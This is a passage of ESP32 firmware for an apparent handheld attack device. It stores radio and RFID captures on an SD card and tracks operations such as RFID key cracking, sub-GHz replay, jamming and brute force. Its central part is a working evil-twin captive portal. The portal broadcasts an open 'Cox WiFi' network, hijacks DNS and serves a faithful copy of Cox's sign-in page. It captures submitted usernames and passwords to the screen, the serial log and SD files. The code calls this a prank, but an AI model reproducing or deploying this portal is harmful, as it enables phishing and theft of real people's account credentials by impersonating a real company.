    f.printf("pktlen=%d\nsync=%02X%02X\nburst=%d\ngap=%d\npayload=", ccPktLen, ccSync1, ccSync0, ccBurstCount, ccBurstGap);
    for (int i = 0; i < ccPktLen; i++) f.printf("%02X", ccPayload[i]);
    f.println();
    f.close();
  }
}

void sdSaveRecording() {
  if (!sdOk) return;
  sendAndWait("CC_RECGET", 3000);
  if (!rspReady || strncmp(rspBuf, "RG,0", 4) == 0) return;
  int n = 1;
  char path[48];
  do { snprintf(path, sizeof(path), "/kodi/rec/rec_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (!f) return;
  f.printf("KODI,REC,1.0\n%s\n", rspBuf + 3);
  while (waitReply(3000)) {
    if (strncmp(rspBuf, "RD,DONE", 7) == 0) break;
    if (strncmp(rspBuf, "RD,", 3) == 0) {
      const char* p = rspBuf + 3;
      while (*p && *p != ',') p++;
      if (*p == ',') p++;
      while (*p && *p != ',') p++;
      if (*p == ',') p++;
      f.println(p);
    }
  }
  f.close();
}

void sdListFiles(const char* dir) {
  fileCount = 0;
  if (!sdOk) return;
  File root = SD.open(dir);
  if (!root) return;
  File entry;
  while ((entry = root.openNextFile()) && fileCount < 20) {
    if (!entry.isDirectory()) {
      strlcpy(fileList[fileCount], entry.name(), 32);
      fileNames[fileCount][0] = '\0';
      char line[64];
      int len = entry.readBytesUntil('\n', line, 63); line[len] = '\0';
      while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
      len = entry.readBytesUntil('\n', line, 63); line[len] = '\0';
      while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
      if (strncmp(line, "name=", 5) == 0) {
        strlcpy(fileNames[fileCount], line + 5, 32);
      }
      fileCount++;
    }
    entry.close();
  }
  root.close();
}

bool sdDeleteFile(const char* path) {
  if (!sdOk) return false;
  return SD.remove(path);
}

bool sdLoadRfid(const char* path) {
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  char line[128];
  rfidName[0] = '\0';
  while (f.available()) {
    int len = f.readBytesUntil('\n', line, 127);
    line[len] = '\0';
    while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
    if (strncmp(line, "uid=", 4) == 0) {
      strlcpy(rfidUid, line + 4, 32);
    } else if (strncmp(line, "len=", 4) == 0) {
      rfidUidLen = atoi(line + 4);
    } else if (strncmp(line, "name=", 5) == 0) {
      strlcpy(rfidName, line + 5, 32);
    }
  }
  f.close();
  return rfidUidLen > 0;
}

bool sdLoadCcProfile(const char* path) {
  File f = SD.open(path, FILE_READ);
  if (!f) return false;
  ccProfileName[0] = '\0';
  char line[256];
  while (f.available()) {
    int len = f.readBytesUntil('\n', line, 255);
    line[len] = '\0';
    while (len > 0 && (line[len-1] == '\r' || line[len-1] == '\n')) line[--len] = '\0';
    if (strncmp(line, "name=", 5) == 0) { strlcpy(ccProfileName, line+5, 32); }
    else if (strncmp(line, "freq=", 5) == 0) ccFreq = atof(line+5);
    else if (strncmp(line, "mod=", 4) == 0) ccMod = atoi(line+4);
    else if (strncmp(line, "rate=", 5) == 0) ccRate = atoi(line+5);
    else if (strncmp(line, "power=", 6) == 0) ccPower = atoi(line+6);
    else if (strncmp(line, "pktlen=", 7) == 0) ccPktLen = atoi(line+7);
    else if (strncmp(line, "sync=", 5) == 0) {
      const char* sh = line + 5;
      if (sh[0] && sh[1]) { char hh[3]={sh[0],sh[1],0}; ccSync1=(uint8_t)strtol(hh,NULL,16); }
      if (sh[2] && sh[3]) { char hh[3]={sh[2],sh[3],0}; ccSync0=(uint8_t)strtol(hh,NULL,16); }
    }
    else if (strncmp(line, "burst=", 6) == 0) ccBurstCount = atoi(line+6);
    else if (strncmp(line, "gap=", 4) == 0) ccBurstGap = atoi(line+4);
    else if (strncmp(line, "payload=", 8) == 0) {
      const char* hex = line + 8;
      ccPktLen = 0;
      while (hex[0] && hex[1] && ccPktLen < 61) {
        char h[3] = {hex[0], hex[1], 0};
        ccPayload[ccPktLen++] = (uint8_t)strtol(h, NULL, 16);
        hex += 2;
      }
    }
  }
  f.close();
  if (ccPktLen > 61) ccPktLen = 61;
  if (ccPktLen < 1) ccPktLen = 1;
  if (ccMod > 3) ccMod = 0;
  if (ccRate > 5) ccRate = 0;
  if (ccPower > 7) ccPower = 7;
  if (ccFreq < 300.0f) ccFreq = 433.92f;
  if (ccFreq > 928.0f) ccFreq = 433.92f;
  if (ccBurstCount < 1) ccBurstCount = 1;
  if (ccBurstCount > 50) ccBurstCount = 50;
  if (ccBurstGap < 1) ccBurstGap = 1;
  if (ccBurstGap > 500) ccBurstGap = 500;
  return true;
}

// ═══════════════════════════════════════════════════════════
//  CAPTIVE PORTAL HTML
// ═══════════════════════════════════════════════════════════

const char prankPortalHtml[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Cox WiFi Hotspots</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f5f6f7;color:#333;-webkit-font-smoothing:antialiased}
.nav{background:#fff;border-bottom:1px solid #ddd;padding:0 20px;height:64px;display:flex;align-items:center;justify-content:space-between}
.logo{display:flex;align-items:center;gap:10px}
.logo svg{width:70px;height:36px}
.logo-divider{width:1px;height:28px;background:#ccc;margin:0 6px}
.logo-txt{font-size:16px;font-weight:400;color:#5a5a5a;letter-spacing:.3px}
.nav-links{display:flex;gap:20px}
.nav-links a{font-size:13px;color:#005da6;text-decoration:none}
.hero{background:linear-gradient(135deg,#005da6 0%,#003b6f 100%);padding:40px 20px 36px;text-align:center;color:#fff}
.hero h1{font-size:24px;font-weight:300;margin-bottom:6px;letter-spacing:.2px}
.hero p{font-size:14px;opacity:.85;font-weight:300}
.card{max-width:400px;margin:-24px auto 30px;background:#fff;border-radius:6px;padding:32px 28px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
.card h2{font-size:18px;font-weight:600;margin-bottom:6px;color:#222}
.card .sub{font-size:13px;color:#888;margin-bottom:22px}
.field{margin-bottom:16px}
.field label{display:block;font-size:13px;font-weight:600;color:#444;margin-bottom:5px}
.field input{width:100%;padding:11px 12px;border:1px solid #c8c8c8;border-radius:4px;font-size:15px;color:#333;background:#fff;transition:border .2s}
.field input:focus{border-color:#005da6;outline:none;box-shadow:0 0 0 2px rgba(0,93,166,.12)}
.field input::placeholder{color:#aaa}
.btn{width:100%;padding:12px;background:#005da6;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:.3px;transition:background .2s}
.btn:hover{background:#004a8a}
.btn:active{background:#003b6f}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:#005da6;text-decoration:none}
.links a:hover{text-decoration:underline}
.divider{border-top:1px solid #e8e8e8;margin:22px 0 18px}
.alt{text-align:center;font-size:13px;color:#666}
.alt a{color:#005da6;font-weight:600;text-decoration:none}
.check{display:flex;align-items:center;gap:8px;margin-bottom:18px;font-size:13px;color:#555}
.check input{width:16px;height:16px;accent-color:#005da6}
.ft{background:#fff;border-top:1px solid #ddd;padding:20px;text-align:center;margin-top:40px}
.ft-links{display:flex;justify-content:center;gap:16px;flex-wrap:wrap;margin-bottom:8px}
.ft-links a{font-size:11px;color:#005da6;text-decoration:none}
.ft-copy{font-size:11px;color:#999}
.e{color:#c0392b;font-size:13px;margin-top:12px;padding:10px;background:#fdf0ef;border-radius:4px}
</style></head><body>
<div class="nav">
<div class="logo">
<svg viewBox="0 0 200 90" xmlns="http://www.w3.org/2000/svg">
<path d="M62 18 Q100 0 138 18" stroke="#005da6" stroke-width="6" fill="none" stroke-linecap="round"/>
<text x="10" y="72" font-family="Arial,Helvetica,sans-serif" font-weight="700" font-size="68" fill="#005da6" letter-spacing="-2">cox</text>
</svg>
<div class="logo-divider"></div>
<span class="logo-txt">WiFi Hotspots</span>
</div>
<div class="nav-links"><a href="#">Find a Hotspot</a><a href="#">Support</a></div>
</div>
<div class="hero">
<h1>Welcome to Cox WiFi</h1>
<p>Sign in with your Cox account to get connected</p>
</div>
<div class="card">
<h2>Sign In</h2>
<p class="sub">Use your Cox.com User ID and password</p>
<form method="POST" action="/a">
<div class="field"><label>User ID or Email Address</label><input type="text" name="u" placeholder="name@example.com" required autocomplete="off" autofocus></div>
<div class="field"><label>Password</label><input type="password" name="p" placeholder="Enter your password" required autocomplete="off"></div>
<div class="check"><input type="checkbox" checked><span>Keep me signed in on this device</span></div>
<button class="btn" type="submit">Sign In</button>
</form>
<div class="links"><a href="#">Forgot User ID?</a><a href="#">Forgot Password?</a></div>
<div class="divider"></div>
<p class="alt">Don't have a Cox account? <a href="#">Get Cox WiFi</a></p>
</div>
<div class="ft">
<div class="ft-links"><a href="#">Privacy Policy</a><a href="#">Terms of Service</a><a href="#">Ad Choices</a><a href="#">Accessibility</a></div>
<p class="ft-copy">&copy; 2025 Cox Communications, Inc. All rights reserved.</p>
</div>
</body></html>
)rawliteral";

const char portalSuccessHtml[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title><style>
body{font-family:-apple-system,sans-serif;text-align:center;padding:60px 20px;background:#f2f2f7}
h2{color:#34c759;font-size:22px;margin-bottom:12px}
p{color:#86868b;font-size:15px}
</style></head><body>
<h2>&#10004; Connected Successfully</h2>
<p>You are now online. You may close this page.</p>
</body></html>
)rawliteral";

// ═══════════════════════════════════════════════════════════
//  WIFI FUNCTIONS
// ═══════════════════════════════════════════════════════════

void sdSaveWifi(const char* ssid, const char* user, const char* pass) {
  if (!sdOk) return;
  int n = 1;
  char path[48];
  do { snprintf(path, sizeof(path), "/kodi/wifi/wifi_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (f) {
    f.printf("KODI,WIFI,1.0\nssid=%s\n", ssid);
    if (user[0]) f.printf("user=%s\n", user);
    f.printf("pass=%s\n", pass);
    f.close();
  }
}

void wifiScanNets() {
  Serial.println(F("[WIFI] Scanning..."));
  if (oledOk) {
    oled.clearDisplay(); oled.setTextColor(SSD1306_WHITE);
    oled.setTextSize(1);
    oled.setCursor(0, 0); oled.print(F("WIFI SCANNING"));
    oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    oled.setCursor(0, 24); oled.print(F("Please wait..."));
    oled.display();
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks(false, true);
  wifiNetCount = min(n, (int)MAX_NETS);
  for (int i = 0; i < wifiNetCount; i++) {
    strncpy(wifiNets[i].ssid, WiFi.SSID(i).c_str(), 32);
    wifiNets[i].ssid[32] = '\0';
    memcpy(wifiNets[i].bssid, WiFi.BSSID(i), 6);
    wifiNets[i].rssi = WiFi.RSSI(i);
    wifiNets[i].channel = WiFi.channel(i);
    wifiNets[i].encType = WiFi.encryptionType(i);
    Serial.printf("[WIFI] %d: %-24s Ch%d %ddBm %s\n", i, wifiNets[i].ssid,
      wifiNets[i].channel, wifiNets[i].rssi,
      wifiNets[i].encType == WIFI_AUTH_OPEN ? "OPEN" : "ENC");
  }
  WiFi.scanDelete();
  wifiScanned = true;
  espNowRestart();
  Serial.printf("[WIFI] Found %d networks\n", wifiNetCount);
}

void oledShowCapture(const char* user, const char* pass) {
  if (!oledOk) return;
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SSD1306_WHITE);
  oled.setCursor(0, 0);
  oled.print(F("=== CAPTURED ==="));
  oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
  if (user[0]) {
    oled.setCursor(0, 14);
    oled.print(F("User:"));
    oled.setCursor(0, 24);
    oled.print(user);
  }
  oled.setCursor(0, user[0] ? 38 : 14);
  oled.print(F("Pass:"));
  oled.setCursor(0, user[0] ? 48 : 24);
  oled.print(pass);
  oled.display();
}

void portalServeRoot() {
  if (!wifiServer) return;
  wifiServer->send_P(200, "text/html", prankPortalHtml);
}

void portalHandleAuth() {
  if (!wifiServer) return;
  String pass = wifiServer->arg("p");
  String user = wifiServer->hasArg("u") ? wifiServer->arg("u") : String("");

  user.toCharArray(capturedUser, sizeof(capturedUser));
  pass.toCharArray(capturedPass, sizeof(capturedPass));
  oledShowCapture(capturedUser, capturedPass);
  Serial.printf("[PORTAL] User=%s Pass=%s\n", capturedUser, capturedPass);

  sdSaveWifi("Cox WiFi", capturedUser, capturedPass);
  wifiServer->send(200, "text/html", FPSTR(portalSuccessHtml));
  needRedraw = true;
}

void startEvilTwin() {
  capturedPass[0] = '\0';
  capturedUser[0] = '\0';

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("Cox WiFi", NULL, 6);
  delay(200);

  wifiDns = new DNSServer();
  wifiDns->start(53, "*", WiFi.softAPIP());

  wifiServer = new WebServer(80);
  wifiServer->on("/", portalServeRoot);
  wifiServer->on("/a", HTTP_POST, portalHandleAuth);
  wifiServer->onNotFound(portalServeRoot);
  wifiServer->begin();

  evilTwinActive = true;
  ledRed();
}

void stopEvilTwin() {
  evilTwinActive = false;
  ledOff();
  if (wifiServer) { wifiServer->stop(); delete wifiServer; wifiServer = nullptr; }
  if (wifiDns) { wifiDns->stop(); delete wifiDns; wifiDns = nullptr; }
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  espNowRestart();
}

void updateEvil() {
  if (!evilTwinActive) return;
  if (wifiDns) wifiDns->processNextRequest();
  if (wifiServer) wifiServer->handleClient();
  portalClients = WiFi.softAPgetStationNum();
}



// ═══════════════════════════════════════════════════════════
//  NEURAL NETWORK — Core Engine
// ═══════════════════════════════════════════════════════════

void nnAddReport(uint8_t severity, const char* fmt, ...) {
  NnReportEntry& e = nnReports[nnRptHead];
  e.timestamp = millis();
  e.severity = severity;
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(e.msg, NN_MSG_LEN, fmt, ap);
  va_end(ap);
  nnRptHead = (nnRptHead + 1) % NN_RPT_MAX;
  if (nnRptCount < NN_RPT_MAX) nnRptCount++;
}

NnOp nnClassifyCmd(const char* cmd) {
  if (strncmp(cmd, "RFID_CRACK", 10) == 0 || strncmp(cmd, "RFID_CRACKPOLL", 14) == 0 ||
      strncmp(cmd, "RFID_CRACKSTOP", 14) == 0 || strncmp(cmd, "RFID_KEY", 8) == 0)
    return NN_OP_RFID_CRACK;
  if (strncmp(cmd, "RFID_LOOP", 9) == 0 || strncmp(cmd, "RFID_STOP", 9) == 0) return NN_OP_RFID_LOOP;
  if (strncmp(cmd, "RFID", 4) == 0) return NN_OP_RFID_SCAN;
  if (strncmp(cmd, "CC_REPLAY", 9) == 0) return NN_OP_CC_REPLAY;
  if (strncmp(cmd, "CC_REC", 6) == 0) return NN_OP_CC_RECORD;
  if (strncmp(cmd, "CC_RXPOLL", 9) == 0 || strncmp(cmd, "CC_RX", 5) == 0 ||
      strncmp(cmd, "CC_RXSTOP", 9) == 0) return NN_OP_CC_RX;
  if (strncmp(cmd, "CC_TX", 5) == 0) return NN_OP_CC_TX;
  if (strncmp(cmd, "CC_JAM", 6) == 0) return NN_OP_CC_JAM;
  if (strncmp(cmd, "CC_BF", 5) == 0) return NN_OP_CC_BF;
  if (strncmp(cmd, "CC_CW", 5) == 0) return NN_OP_CC_CW;
  if (strncmp(cmd, "CC_SCAN", 7) == 0) return NN_OP_CC_SCAN;
  if (strncmp(cmd, "CC_INIT", 7) == 0 || strncmp(cmd, "CC_FREQ", 7) == 0 ||
      strncmp(cmd, "CC_VER", 6) == 0 || strncmp(cmd, "CC_RSSI", 7) == 0) return NN_OP_CC_TX;
  if (strncmp(cmd, "STATUS", 6) == 0) return NN_OP_STATUS;
  return NN_OP_PING;
}

void nnObserveCmd(const char* cmd, bool success, uint32_t responseMs) {
  NnOp op = nnClassifyCmd(cmd);
  NnOpStats& s = nnStats[op];
  s.uses++;
  if (success) s.successes++;
  else s.failures++;

  float alpha = (s.uses < 5) ? 0.5f : 0.15f;
  if (s.uses == 1) {
    s.avgRespMs = (float)responseMs;
    s.successRate = success ? 1.0f : 0.0f;
  } else {
    s.avgRespMs = s.avgRespMs * (1.0f - alpha) + (float)responseMs * alpha;
    s.successRate = s.successRate * (1.0f - alpha) + (success ? 1.0f : 0.0f) * alpha;
  }

  nnLinkExchanges++;
  float la = (nnLinkExchanges < 5) ? 0.3f : 0.1f;
  nnLinkLatency = nnLinkLatency * (1.0f - la) + (float)responseMs * la;
  nnLinkSuccess = nnLinkSuccess * 0.95f + (success ? 1.0f : 0.0f) * 0.05f;
  if (!success) nnLinkTimeouts++;
  nnTotalOps++;

  if (success) nnConsecFails[op] = 0;
  else {
    nnConsecFails[op]++;
    if (nnConsecFails[op] == 3) {
      nnAddReport(NN_SEV_ALERT, "%s: 3 consecutive failures", nnOpNames[op]);
      ledTriggerFlash(true, false, false, 400);
    }
  }

  bool predicted = (nnPredictedNext == op && nnPredictConf > 0.5f);

  if (nnLastOp < NN_OP_COUNT && nnTransitions[nnLastOp][op] < 65535)
    nnTransitions[nnLastOp][op]++;
  nnLastOp = op;
  nnPredictNext();

  if (predicted && success)
    ledTriggerFlash(false, true, true, 150);

  if (!success && s.uses >= 3 && s.successRate < 0.5f) {
    nnAddReport(NN_SEV_ALERT, "%s failing: %.0f%% success (%lu tries)",
      nnOpNames[op], s.successRate * 100, s.uses);
  } else if (responseMs > 800 && s.avgRespMs > 400 && s.uses >= 3) {
    nnAddReport(NN_SEV_WARN, "%s slow: %lums (avg %.0fms)",
      nnOpNames[op], responseMs, s.avgRespMs);
  }
}

void nnObserveAsync(const char* msg) {
  if (strncmp(msg, "!RY_DONE", 8) == 0) {
    nnStats[NN_OP_CC_REPLAY].successes++;
    nnAddReport(NN_SEV_INFO, "Replay completed (%d TX)", atoi(msg + 9));
  } else if (strncmp(msg, "!BF_DONE", 8) == 0) {
    nnStats[NN_OP_CC_BF].successes++;
    nnAddReport(NN_SEV_INFO, "Brute force sweep complete");
  } else if (strncmp(msg, "!REC_FULL", 9) == 0) {
    nnStats[NN_OP_CC_RECORD].successes++;
    nnAddReport(NN_SEV_INFO, "Recording buffer full");
  } else if (strncmp(msg, "!RC_DONE", 8) == 0) {
    nnStats[NN_OP_RFID_CRACK].successes++;
    nnAddReport(NN_SEV_INFO, "RFID crack done: %d keys found", atoi(msg + 9));
  } else if (strncmp(msg, "!RK,", 4) == 0) {
    nnAddReport(NN_SEV_INFO, "RFID key found (sector %d)", atoi(msg + 4));
  } else if (strncmp(msg, "!RF,", 4) == 0) {
    nnStats[NN_OP_RFID_LOOP].uses++;
    nnStats[NN_OP_RFID_LOOP].successes++;
  }
}

void nnPredictNext() {
  if (nnLastOp >= NN_OP_COUNT) { nnPredictedNext = NN_OP_COUNT; return; }
  uint16_t* row = nnTransitions[nnLastOp];
  uint16_t total = 0, best = 0;
  NnOp bestOp = NN_OP_COUNT;
  for (int i = 0; i < NN_OP_COUNT; i++) {
    total += row[i];
    if (row[i] > best) { best = row[i]; bestOp = (NnOp)i; }
  }
  if (total >= 3 && best > 0) {
    nnPredictedNext = bestOp;
    nnPredictConf = (float)best / (float)total;
  } else {
    nnPredictedNext = NN_OP_COUNT;
    nnPredictConf = 0.0f;
  }
}

float nnComputeRisk(NnOp op) {
  float risk = 0.0f;
  if (nnLinkExchanges > 5)
    risk += (1.0f - nnLinkSuccess) * 40.0f;
  if (nnStats[op].uses >= 3)
    risk += (1.0f - nnStats[op].successRate) * 30.0f;
  uint32_t heap = ESP.getFreeHeap();
  if (heap < 50000)
    risk += (1.0f - (float)heap / 50000.0f) * 20.0f;
  risk += (float)nnConsecFails[op] * 3.3f;
  if (risk > 100.0f) risk = 100.0f;
  return risk;
}

void nnUpdateRecs() {
  nnRecCount = 0;
  for (int i = 0; i < NN_OP_COUNT && nnRecCount < NN_REC_MAX; i++) {
    if (nnStats[i].uses >= 5 && nnStats[i].successRate < 0.6f)
      snprintf(nnRecs[nnRecCount++], NN_REC_LEN, "%s: %.0f%% failing, check link",
        nnOpNames[i], (1.0f - nnStats[i].successRate) * 100);
  }
  for (int i = 0; i < NN_OP_COUNT && nnRecCount < NN_REC_MAX; i++) {
    if (nnStats[i].uses >= 5 && nnLearnerLoaded && nnLearner.opAvgMs[i] > 0) {
      float ratio = nnStats[i].avgRespMs / nnLearner.opAvgMs[i];
      if (ratio > 1.5f)
        snprintf(nnRecs[nnRecCount++], NN_REC_LEN, "%s %.0f%% slower than usual",
          nnOpNames[i], (ratio - 1.0f) * 100);
    }
  }
  uint32_t freeHeap = ESP.getFreeHeap();
  if (freeHeap < 40000 && evilTwinActive && nnRecCount < NN_REC_MAX)
    snprintf(nnRecs[nnRecCount++], NN_REC_LEN, "Heap low (%luK) - close Evil Twin?", freeHeap/1024);
  if (nnPredictedNext < NN_OP_COUNT && nnPredictConf > 0.5f && nnRecCount < NN_REC_MAX)
    snprintf(nnRecs[nnRecCount++], NN_REC_LEN, "Predicted next: %s (%.0f%%)",
      nnOpNames[nnPredictedNext], nnPredictConf * 100);
}

void nnLoadLearner() {
  if (!sdOk) return;
  File f = SD.open("/kodi/nn/learner.bin", FILE_READ);
  if (!f) {
    memset(&nnLearner, 0, sizeof(nnLearner));
    nnLearner.magic = NN_LEARNER_MAGIC;
    nnLearner.version = NN_LEARNER_VER;
    nnLearnerLoaded = true;
    return;
  }
  if ((size_t)f.size() == sizeof(NnLearnerState)) {
    f.read((uint8_t*)&nnLearner, sizeof(NnLearnerState));
    if (nnLearner.magic != NN_LEARNER_MAGIC || nnLearner.version != NN_LEARNER_VER) {
      memset(&nnLearner, 0, sizeof(nnLearner));
      nnLearner.magic = NN_LEARNER_MAGIC;
      nnLearner.version = NN_LEARNER_VER;
    }
  } else {
    memset(&nnLearner, 0, sizeof(nnLearner));
    nnLearner.magic = NN_LEARNER_MAGIC;
    nnLearner.version = NN_LEARNER_VER;
  }
  f.close();
  nnLearnerLoaded = true;
  memcpy(nnTransitions, nnLearner.transitions, sizeof(nnTransitions));
  memset(nnSavedOpUses, 0, sizeof(nnSavedOpUses));
  memset(nnSavedOpSuccesses, 0, sizeof(nnSavedOpSuccesses));
  nnSavedOps = 0;
}

void nnSaveLearner() {
  if (!sdOk || !nnLearnerLoaded) return;
  if (!nnSessionCounted) {
    nnLearner.totalSessions++;
    nnSessionCounted = true;
  }
  nnLearner.lifetimeOps += (nnTotalOps - nnSavedOps);
  nnSavedOps = nnTotalOps;
  for (int i = 0; i < NN_OP_COUNT; i++) {
    nnLearner.opUses[i] += (nnStats[i].uses - nnSavedOpUses[i]);
    nnLearner.opSuccesses[i] += (nnStats[i].successes - nnSavedOpSuccesses[i]);
    nnSavedOpUses[i] = nnStats[i].uses;
    nnSavedOpSuccesses[i] = nnStats[i].successes;
  }
  float sessionSec = (float)(millis() - nnSessionStart) / 1000.0f;
  if (nnLearner.totalSessions <= 1)
    nnLearner.avgSessionSec = sessionSec;
  else
    nnLearner.avgSessionSec = nnLearner.avgSessionSec * 0.8f + sessionSec * 0.2f;

  memcpy(nnLearner.transitions, nnTransitions, sizeof(nnTransitions));
  for (int i = 0; i < NN_OP_COUNT; i++) {
    if (nnStats[i].uses > 0 && nnStats[i].avgRespMs > 0) {
      if (nnLearner.opAvgMs[i] == 0)
        nnLearner.opAvgMs[i] = nnStats[i].avgRespMs;
      else
        nnLearner.opAvgMs[i] = nnLearner.opAvgMs[i] * 0.7f + nnStats[i].avgRespMs * 0.3f;
    }
  }

  File f = SD.open("/kodi/nn/learner.bin", FILE_WRITE);
  if (f) {
    f.write((const uint8_t*)&nnLearner, sizeof(NnLearnerState));
    f.close();
  }
}

void nnSaveReport() {
  if (!sdOk || nnRptCount == 0) return;
  int n = 1;
  char path[48];
  do { snprintf(path, sizeof(path), "/kodi/neural/nn_%03d.txt", n++); } while (SD.exists(path) && n < 999);
  if (SD.exists(path)) return;
  File f = SD.open(path, FILE_WRITE);
  if (!f) return;
  char ts[32];
  getTimestampLA(ts, sizeof(ts));
  f.printf("KODI,NEURAL,1.0\nname=Neural Report %s\nentries=%d\n", ts, nnRptCount);
  int start = (nnRptCount < NN_RPT_MAX) ? 0 : nnRptHead;
  for (int i = 0; i < nnRptCount; i++) {
    int idx = (start + i) % NN_RPT_MAX;
    NnReportEntry& e = nnReports[idx];
    uint32_t sec = e.timestamp / 1000;
    const char* sev = (e.severity == NN_SEV_ALERT) ? "ALERT" :
                      (e.severity == NN_SEV_WARN) ? "WARN" : "INFO";
    f.printf("[%lu:%02lu] %s: %s\n", sec / 60, sec % 60, sev, e.msg);
  }
  f.printf("--- SESSION STATS ---\n");
  f.printf("uptime=%lus ops=%lu link=%.0f%% latency=%.0fms\n",
    (millis() - nnSessionStart) / 1000, nnTotalOps, nnLinkSuccess * 100, nnLinkLatency);
  f.printf("heap=%luKB min=%luKB\n", ESP.getFreeHeap() / 1024, nnMinHeap / 1024);
  for (int i = 0; i < NN_OP_COUNT; i++) {
    if (nnStats[i].uses > 0) {
      float risk = nnComputeRisk((NnOp)i);
      f.printf("%s: %lu uses %.0f%% ok %.0fms risk=%.0f",
        nnOpNames[i], nnStats[i].uses, nnStats[i].successRate * 100, nnStats[i].avgRespMs, risk);
      if (nnLearnerLoaded && nnLearner.opAvgMs[i] > 0)
        f.printf(" drift=%+.0fms", nnStats[i].avgRespMs - nnLearner.opAvgMs[i]);
      f.print("\n");
    }
  }
  if (nnRecCount > 0) {
    f.printf("--- INSIGHTS ---\n");
    for (int i = 0; i < nnRecCount; i++)
      f.printf("%s\n", nnRecs[i]);
  }
  if (nnPredictedNext < NN_OP_COUNT)
    f.printf("prediction=%s conf=%.0f%%\n", nnOpNames[nnPredictedNext], nnPredictConf * 100);
  f.close();
}

void nnTick() {
  uint32_t now = millis();
  if (now - nnLastTick < 1000) return;
  nnLastTick = now;

  uint32_t freeHeap = ESP.getFreeHeap();
  if (freeHeap < nnMinHeap) nnMinHeap = freeHeap;
  if (freeHeap < 20000 && now - nnLastHeapWarn > 30000) {
    nnAddReport(NN_SEV_ALERT, "Low heap: %luKB free (min %luKB)",
      freeHeap / 1024, nnMinHeap / 1024);
    nnLastHeapWarn = now;
  }

  if (nnLinkExchanges > 10 && nnLinkSuccess < 0.7f && now - nnLastLinkWarn > 30000) {
    nnAddReport(NN_SEV_ALERT, "Link unstable: %.0f%% ok, %.0fms avg",
      nnLinkSuccess * 100, nnLinkLatency);
    nnLastLinkWarn = now;
  }

  if (now - nnLastRecUpdate > 5000) {
    nnUpdateRecs();
    nnLastRecUpdate = now;
  }

  if (now - nnLastSave > 300000 && sdOk) {
    nnSaveLearner();
    nnLastSave = now;
  }
}

void nnInit() {
  memset(nnStats, 0, sizeof(nnStats));
  memset(nnReports, 0, sizeof(nnReports));
  memset(nnConsecFails, 0, sizeof(nnConsecFails));
  memset(nnTransitions, 0, sizeof(nnTransitions));
  memset(nnRecs, 0, sizeof(nnRecs));
  nnRecCount = 0;
  nnLastOp = NN_OP_COUNT;
  nnPredictedNext = NN_OP_COUNT;
  nnPredictConf = 0.0f;
  nnRptHead = 0;
  nnRptCount = 0;
  nnSessionStart = millis();
  nnTotalOps = 0;
  nnMinHeap = ESP.getFreeHeap();
  nnLastTick = millis();
  nnLastSave = millis();
  nnLastRecUpdate = millis();
  nnLoadLearner();
  if (nnLearnerLoaded && nnLearner.totalSessions > 0)
    nnAddReport(NN_SEV_INFO, "Neural online. %lu sessions, %lu lifetime ops",
      nnLearner.totalSessions, nnLearner.lifetimeOps);
  else
    nnAddReport(NN_SEV_INFO, "Neural online. First session.");
  nnAddReport(NN_SEV_INFO, "Heap: %luKB free", ESP.getFreeHeap() / 1024);
}

// ═══════════════════════════════════════════════════════════
//  UI DRAWING HELPERS
// ═══════════════════════════════════════════════════════════

void drawHeader(const char* title) {
  tft.fillRect(0, 0, 320, 50, C_HEADER);
  tft.drawFastHLine(0, 49, 320, C_DGREEN);
  tft.setTextColor(C_CYAN, C_HEADER);
  tft.setTextSize(2);
  tft.setCursor(10, 16);
  tft.print(title);

  if (curScreen != SCR_HOME) {
    tft.fillRoundRect(224, 3, 92, 44, 4, C_DGREEN);
    tft.setTextSize(2);
    tft.setCursor(246, 17);
    tft.setTextColor(C_WHITE, C_DGREEN);
    tft.print("BACK");
  }

  if (curScreen == SCR_HOME) {
    tft.setTextColor(C_CYAN, C_HEADER);
    tft.setTextSize(1);
    tft.setCursor(180, 22);
    if (sdOk) {
      if (sdFreeMB >= 10240) tft.printf("SD:%uG", (unsigned)(sdFreeMB / 1024));
      else if (sdFreeMB >= 1024) tft.printf("SD:%.1fG", sdFreeMB / 1024.0f);
      else tft.printf("SD:%lum", (unsigned long)sdFreeMB);
    } else {
      tft.print("SD:--");
    }
  }
}

void drawFooter(const char* text) {
  tft.fillRect(0, 455, 320, 25, C_PANEL);
  tft.setTextColor(C_CYAN, C_PANEL);
  tft.setTextSize(1);
  tft.setCursor(10, 462);
  tft.print(text);
}

void drawBtn(int x, int y, int w, int h, const char* label, uint16_t bg, uint16_t fg) {
  tft.fillRoundRect(x, y, w, h, 4, bg);
  tft.drawRoundRect(x, y, w, h, 4, C_GREEN);
  tft.setTextColor(fg, bg);
  tft.setTextSize(2);
  int tw = strlen(label) * 12;
  tft.setCursor(x + (w - tw) / 2, y + (h - 14) / 2);
  tft.print(label);
}

void drawSmBtn(int x, int y, int w, int h, const char* label, uint16_t bg) {
  tft.fillRoundRect(x, y, w, h, 3, bg);
  tft.drawRoundRect(x, y, w, h, 3, C_GREEN);
  tft.setTextColor(C_BG, bg);
  tft.setTextSize(1);
